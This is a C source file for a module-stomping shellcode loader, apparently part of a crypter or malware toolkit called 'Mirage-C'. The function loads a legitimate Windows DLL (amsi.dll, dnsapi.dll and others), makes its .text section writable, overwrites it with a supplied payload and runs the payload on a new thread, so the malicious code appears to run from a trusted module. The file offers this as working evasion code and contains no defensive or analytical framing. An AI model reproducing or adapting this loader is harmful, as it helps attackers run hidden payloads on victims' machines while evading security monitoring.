/*
 * loader_stomp.c — Module stomping execution for Mirage-C
 *
 * Loads a legitimate DLL, overwrites its .text section with payload,
 * and executes from the legitimate module context.
 *
 * Reference: Eidos-Crypter GodMode.cpp + Phantom.cpp
 * CRT-free, PEB-walk only.
 */

#include "loader_stomp.h"
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "enc_strings.h"
#include "config.h"
#include <windows.h>

/* Candidate DLLs — guaranteed loaded in any process, small .text */
static const char *CANDIDATE_DLLS[] = {
    "amsi.dll",
    "dnsapi.dll",
    "dxgi.dll",
    "clbcatq.dll",
};
#define CANDIDATE_COUNT 4

typedef struct {
    uint8_t *text_base;
    size_t    text_size;
    DWORD     old_protect;
    HMODULE   dll_handle;
} stomp_state_t;

static stomp_state_t g_stomp = {0};

int loader_stomp_execute(const unsigned char *payload, size_t payload_size) {
    if (!payload || payload_size == 0) return 0;

    /* Try each candidate DLL */
    for (int i = 0; i < CANDIDATE_COUNT; i++) {
        char dll_name[64];
        /* Resolve DLL name via enc_strings or use plain text */
        /* For now: use hardcoded names (these are benign DLL names, fingerprinting risk is low) */

        HMODULE hDll = LoadLibraryA(CANDIDATE_DLLS[i]);
        if (!hDll) continue;

        /* Walk PE headers to find .text */
        uint8_t *base = (uint8_t *)hDll;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            FreeLibrary(hDll);
            continue;
        }

        PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            FreeLibrary(hDll);
            continue;
        }

        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        for (WORD s = 0; s < nt->FileHeader.NumberOfSections; s++) {
            if ((sec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                sec[s].Name[0] == '.' && sec[s].Name[1] == 't' &&
                sec[s].Name[2] == 'e' && sec[s].Name[3] == 'x' && sec[s].Name[4] == 't') {

                size_t text_size = sec[s].Misc.VirtualSize;
                if (text_size < payload_size) break;

                uint8_t *text_addr = base + sec[s].VirtualAddress;

                /* Make .text writable */
                DWORD old_protect;
                if (!VirtualProtect(text_addr, text_size,
                                    PAGE_EXECUTE_READWRITE, &old_protect)) {
                    break;
                }

                /* Overwrite with payload */
                memcpy(text_addr, payload, payload_size);

                /* Restore protection */
                VirtualProtect(text_addr, text_size, PAGE_EXECUTE_READ, &old_protect);

                /* Execute */
                DWORD tid;
                HANDLE hThread = CreateThread(NULL, 0,
                    (LPTHREAD_START_ROUTINE)text_addr, NULL, 0, &tid);
                if (hThread) {
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                }

                FreeLibrary(hDll);
                return 1;
            }
        }
        FreeLibrary(hDll);
    }
    return 0;
}
